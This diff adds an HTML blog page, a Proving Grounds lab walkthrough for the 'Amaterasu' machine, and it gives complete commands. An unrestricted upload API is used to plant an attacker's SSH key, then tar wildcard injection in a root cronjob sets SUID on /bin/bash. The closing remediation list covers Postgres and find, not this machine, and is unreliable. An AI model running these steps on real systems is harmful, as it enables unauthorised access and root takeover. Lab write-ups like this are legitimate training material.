@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Walkthrough: PG -Amaterasu</title>
+  <link rel="preconnect" href="https://googleapis.com" />
+  <link rel="preconnect" href="https://gstatic.com" crossorigin />
+  <link href="https://googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0d0d0f;
+      --surface:   #141417;
+      --surface2:  #1a1a1f;
+      --border:    #2a2a32;
+      --text:      #e8e8ec;
+      --muted:     #6b6b78;
+      --subtle:    #9898a8;
+      --accent:    #7c6af7;
+      --accent-bg: #1a1730;
+      --green:     #4ade80;
+      --green-bg:  #0d2318;
+      --amber:     #fbbf24;
+      --amber-bg:  #221a00;
+      --red:       #f87171;
+      --red-bg:    #220d0d;
+      --mono:      'JetBrains Mono', monospace;
+      --sans:      'Inter', sans-serif;
+      --radius:    6px;
+    }
+
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg:        #f8f8fa;
+        --surface:   #ffffff;
+        --surface2:  #f1f1f5;
+        --border:    #e0e0e8;
+        --text:      #111118;
+        --muted:     #9090a0;
+        --subtle:    #555560;
+        --accent:    #5b4de0;
+        --accent-bg: #eeecff;
+        --green:     #16a34a;
+        --green-bg:  #dcfce7;
+        --amber:     #b45309;
+        --amber-bg:  #fef3c7;
+        --red:       #dc2626;
+        --red-bg:    #fee2e2;
+      }
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 14px;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .site {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    /* NAV */
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 3rem;
+    }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+    }
+
+    .nav-brand .accent { color: var(--accent); }
+
+    .nav-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .nav-links a {
+      font-size: 13px;
+      color: var(--subtle);
+    }
+
+    .nav-links a:hover {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    /* POST HEADERS & NARRATIVE */
+    .post-header { margin-bottom: 2.5rem; }
+    
+    .eyebrow {
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-header h1 {
+      font-family: var(--sans);
+      font-size: 36px;
+      font-weight: 500;
+      color: var(--text);
+      line-height: 1.2;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-meta {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 1.5rem;
+    }
+
+    .diff {
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 500;
+    }
+    .diff-easy { background: var(--green-bg); color: var(--green); }
+    .diff-med  { background: var(--amber-bg); color: var(--amber); }
+    .diff-hard { background: var(--red-bg);   color: var(--red);   }
+
+    p { font-family: var(--sans); color: var(--subtle); margin-bottom: 1.25rem; font-size: 14px; }
+    p em { color: var(--muted); }
+    p strong { color: var(--text); }
+
+    h2 {
+      font-family: var(--sans);
+      font-size: 20px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 3rem 0 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h3 {
+      font-family: var(--sans);
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 1.5rem 0 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* 0xdf SPECIFIC COMPONENT STYLES */
+    .summary-box {
+      background: var(--surface);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      padding: 1.25rem;
+      margin-bottom: 2rem;
+    }
+    .summary-box p { margin-bottom: 0; }
+
+    ul {
+      margin-bottom: 1.5rem;
+      padding-left: 1.25rem;
+    }
+    li {
+      font-family: var(--sans);
+      color: var(--subtle);
+      font-size: 14px;
+      margin-bottom: 0.5rem;
+    }
+    li strong { color: var(--text); }
+
+    /* CODE BLOCKS */
+    code {
+      font-family: var(--mono);
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13px;
+      color: var(--text);
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 1.25rem;
+      border-radius: var(--radius);
+      overflow-x: auto;
+      margin-bottom: 1.5rem;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .prompt-symbol { color: var(--accent); font-weight: bold; }
+    .output-muted { color: var(--muted); }
+    .output-highlight { color: var(--green); }
+
+    /* IMAGES */
+    .screenshot {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 6px;
+      max-width: 100%;
+      height: auto;
+      margin: 1.5rem 0;
+      display: block;
+    }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--border);
+      padding-top: 1.5rem;
+      margin-top: 5rem;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="site">
+    <!-- Keep your identical portfolio navigation bar -->
+    <nav>
+      <div class="nav-brand"><span class="accent">~/</span>ajith-g-nayak</div>
+      <div class="nav-links">
+        <a href="../index.html#about">about</a>
+        <a href="../index.html#writeups">writeups</a>
+        <a href="../index.html#projects">projects</a>
+        <a href="../index.html#run-throughs">run-throughs</a>
+        <a href="https://github.com/ajithor" target="_blank" rel="noopener">github</a>
+      </div>
+    </nav>
+
+    <!-- Post Metadata Section -->
+    <header class="post-header">
+      <div class="eyebrow">Proving Grounds Walkthrough</div>
+      <h1>Amaterasu</h1>
+      <div class="post-meta">
+        <span>July 26, 2026</span>
+        <span>•</span>
+        <span class="diff diff-hard">Hard</span>
+        <span>•</span>
+        <span>Target IP: 192.168.176.249</span>
+      </div>
+    </header>
+
+    <div class="summary-box">
+      <p><strong>Summary:</strong> Machine starts with an api running on non-standard port, which has file-upload and directory-listing capabilities. This api is used to introduce the public key of an attacker-generated keypair as authorized keys for ssh. A crontab running a script which uses tar command with wilcard is discovered, which is then exploited to gain root access to the system.</p>
+    </div>
+
+    <h3>Attack Chain</h3>
+    <ul>
+      <li><strong>Foothold:</strong> Port 33414 werkzeug api -> authorized_keys file-write -> Low-Privilege Shell</li>
+      <li><strong>PrivEsc (Root):</strong> cronjob -> script running backup with wildcard in user-controlled dir ->Wildcard Injection</li>
+    </ul>
+
+    <h2>Reconnaissance</h2>
+    <p>As always, we begin with an <code>nmap</code> scan:</p>
+    
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> sudo nmap -Pn -sV -vv 192.168.176.249 -p- --open
+PORT      STATE SERVICE REASON         VERSION
+21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
+25022/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.6 (protocol 2.0)
+33414/tcp open  http    syn-ack ttl 61 Werkzeug httpd 2.2.3 (Python 3.9.13)
+40080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.53 ((Fedora))
+Service Info: OS: Unix</code></pre>
+    
+    <p>Reviewing the nmap scans reveals services on few non-standard ports, and an FTP service. 
+    An <code>nmap</code> scan with the <code>-sC</code> option reveals anonymous login on <code>port 21 FTP</code> is disabled. Next logical options are mannual enumerations of the python server on <code>33414</code> and apache server on <code>40080</code>.
+    </p>
+    <p>Inspection of the apache server suggests it to be some default mozilla page</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:40080</code></pre>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414
+The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</code></pre>
+    
+    <p>A good time to start fuzzing for directories, at this point.</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> gobuster dir --url http://192.168.176.249:33414 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 46
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.176.249:33414
+[+] Method:                  GET
+[+] Threads:                 46
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+help                 (Status: 200) [Size: 137]
+info                 (Status: 200) [Size: 98]</code> </pre>
+
+    <p>Upon visiting the sites, we realize they're api endpoints. Im more comfortable testing api endpoints with curl, so here we go-</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/info               
+["Python File Server REST API v2.5","Author: Alfredo Moroder","GET /help = List of the commands"]
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/help
+["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/file-list?dir=/home
+["alfredo"]
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/file-list?dir=/home/alfredo
+[".bash_logout",".bash_profile",".bashrc","local.txt",".ssh","restapi",".bash_history"]
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/file-list?dir=/home/alfredo/.ssh
+["id_rsa","id_rsa.pub"]</code></pre>
+    <p>So far, we've been able to establish the API's creator, the features of the api, which is <code>file-list?dir=</code> and <code>/file-upload</code>. While we were also able to verify the users in the <code>/home</code> directory of the machine, and that the user already has ssh access via rsa keypair, we havent discovered the way to upload files through the api. Additionally, once we do find the proper format, we cannot just upload a reverse shell, because we dont yet have a way to trigger it (RCE).</p>
+    <p> So a safe bet is to first generate an rsa key-pair, then drop the public-key's copy <code>authorized_keys</code> into the discovered user's <code>.ssh</code> directory. This is so that the ssh server allows additional key-pairs to login with a private-key that is NOT the user's local one.</p>
+    <p>We'll first determine the format to upload a file. Most APIs have enough error-verbose to inform us exactly how to use the endpoints. It is a good idea to proceed one step at a time. The first step being, it has to be a <code>POST</code> request.</p>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl -X POST --path-as-is http://192.168.176.249:33414/file-upload       
+{"message":"No file part in the request"}</code></pre>
+    
+    <p>Looking at the message, we see the api is telling us to include a parameter, called file. <a href="https://www.warp.dev/terminus/curl-file-upload">This article</a> shows how we can use the <code>curl</code> command to upload file, using the <code>-F</code> or the <code>--form</code> flag.</p>
+    <p>So, let us first prepare a test file for upload</p>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> echo test > test.txt                   
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl -X POST --path-as-is http://192.168.176.249:33414/file-upload -F "file=@/$(pwd)/test.txt"
+{"message":"No filename part in the request"} </code> </pre>
+
+    <p>Now, the message mentions we need to mention a <code>filename</code> parameter, that is presumable the path and name of the destination.</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl -X POST --path-as-is http://192.168.176.249:33414/file-upload -F "file=@/$(pwd)/test.txt" -F "filename=/dev/shm/testfile11223344.txt" 
+{"message":"File successfully uploaded"}
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl --path-as-is http://192.168.176.249:33414/file-list?dir=/dev/shm    
+["testfile11223344.txt"]</code> </pre>
+
+    <p>With this, we have now established a way to upload files into the victim, and verify the same.</p>
+
+    <h2>Foothold</h2>
+
+    <p>For the initial foothold, we just need to generate a new rsa key-pair, and upload the copy of public key, and store it as <code>/home/alfredo/.ssh/authorized_keys</code>, with a privatized access control on the file.</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> ssh-keygen -f id_rsa
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> cat id_rsa.pub > authorized_keys                                               
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> chmod 600 authorized_keys       
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl -X POST --path-as-is http://192.168.176.249:33414/file-upload -F "file=@/$(pwd)/authorized_keys" -F "filename=/home/alfredo/.ssh/authorized_keys"
+{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
+</code></pre>
+    
+    <p>It seems there is a restriction on filetypes. We can try to isolate if the actual restriction is for the source filetype or destination as well, by renaming the <code>authorized_keys</code> to <code>authorized_keys.txt</code>. If the restriction applies for even the destination filename, then we might have to think of some other way to gain initial access.</p>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> cp authorized_keys authorized_keys.txt
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> curl -X POST --path-as-is http://192.168.176.249:33414/file-upload -F "file=@/$(pwd)/authorized_keys.txt" -F "filename=/home/alfredo/.ssh/authorized_keys"
+{"message":"File successfully uploaded"}</code></pre>
+    <p>Fortunately for us, Alfredo has failed to restrict the destination filetypes. So now, we can ssh into the machine as <code>alfredo</code> with our private key.</p>
+
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> ssh alfredo@192.168.176.249 -i id_rsa   
+ssh: connect to host 192.168.176.249 port 22: Connection refused
+                                                                                                                     
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
+└─$</span> ssh alfredo@192.168.176.249 -i id_rsa -p 25022
+<span class="prompt-symbol">[alfredo@fedora ~]$</span> id
+uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
+<span class="prompt-symbol">[alfredo@fedora ~]$</span> ls
+local.txt  restapi
+<span class="prompt-symbol">[alfredo@fedora ~]$</span> wc -c local.txt 
+33 local.txt</code></pre>
+
+    <h2>Privilege Escalation</h2>
+    <p>Now that we have the local user flag, we can proceed with regular privesc mannual checks, like <code>sudo -l</code>, checking any strange files with SUID bits set, crontabs, exports, capabilities, internal ports, groups, writable directories in <code>$PATH</code>, any unusual file is <code>/opt</code>, running processes, groups, etc. Then we can proceed to more advanced ones. Always a good idea to cover the basics mannually, with a checklist, because it is easy to forget or miss simple things.</p>
+    <p>Upon checking for crontab entries, we stumble upon a possible backup script. A notorious thing about backup shell scripts is that, people tend to use the wildcard <code>*</code> to reference "all" files in a certain directory. This can be abused to gain the context of the user running the script.</p>
+    <pre><code><span class="prompt-symbol">[alfredo@fedora ~]$</span> cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+<span class="prompt-symbol">[alfredo@fedora ~]$</span> cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *</code></pre>
+
+    <p>Following the crontab trail, we find that the backup script indeed uses the wildcard character. Hacktricks has <a href="https://hacktricks.wiki/en/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.html">this</a> great article on how to perform wildcard injections.</p>
+    <p> Basically, when any command runs with an unquoted wildcard like <code>*</code>, since the shell expands the wildcard before executing the binary, an attacker who can create files in the working directory can craft filenames that begin with - so they are interpreted as options instead of data, effectively smuggling arbitrary flags or even commands.</p>
+    <p>In our case, <code>tar</code> command has these option flags, <code>--checkpoint</code> and <code>--checkpoiont-actions</code>. The first flag displays progress messages for every n NUMBERTH second, and the other flag allows tar to EXECUTE an action on each checkpoints. If we're able to create files with names of these flags in <code>/home/alfredo/restapi</code> and set an action to execute a malicious code, tar would be able to execute the code in the context of the owner of the cron, viz root</p>
+
+    <p>First, we go the the target directory, <code>/home/alfredo/restapi</code>, and then write a file that, when executed as root, would essentially give us root access. This code can be many things, like adding ourselves to the sudoers group, sending ourselves a reverse shell, or adding an SUID bit on the <code>/bin/bash</code>. Seeing as we have an ssh stable shell, I like to set an SUID bit on the bash binary.</p>
+
+    <pre><code><span class="prompt-symbol">[alfredo@fedora ~]$</span> cd ~/restapi
+<span class="prompt-symbol">[alfredo@fedora restapi]$</span> ls -la /bin/bash
+-rwxr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
+<span class="prompt-symbol">[alfredo@fedora restapi]$</span> echo "chmod u+s /bin/bash" > gimme_root.sh
+<span class="prompt-symbol">[alfredo@fedora restapi]$</span> echo "" > "--checkpoint-action=exec=sh gimme_root.sh"
+<span class="prompt-symbol">[alfredo@fedora restapi]$</span> echo "" > --checkpoint=1
+</code></pre>
+    
+    <p>We have created a file that would set SUID bit on the bash binary. We have creted a checkpoint file, and we have created a checkpoint-action file, that would execute our code. Now, we wait for the cronjob to get executed, and monitor the SUID bit on the bash binary.</p>
+    <p>Once we see the SUID bit set on bash binary, we sinply do <code>bash -p</code> to get a root shell!</p>
+    <pre><code><span class="prompt-symbol">[alfredo@fedora restapi]$</span> ls -la /bin/bash
+-rwsr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
+<span class="prompt-symbol">[alfredo@fedora restapi]$</span> bash -p
+<span class="prompt-symbol">bash-5.1#</span> whoami
+root
+<span class="prompt-symbol">bash-5.1#</span> wc -c /root/proof.txt
+33 /root/proof.txt</code></pre>
+<h2>Remidiations</h2>
+<ul>
+  <li>Restrict the access of Postgresql to Localhost, unless explicitly required to be accessible from external networks.</li>
+  <li>Revoke the Superuser permissions for the default SuperUser postgres, unless explicitly required</li>
+  <li>The password for db user postgres should be a randomly generated long string. Do not use weak passwords that are consistent with weak password policies.</li>
+  <li>The find command should not have SUID set for all users.</li>
+</ul>
+
+</div>
+</body>
+</html>
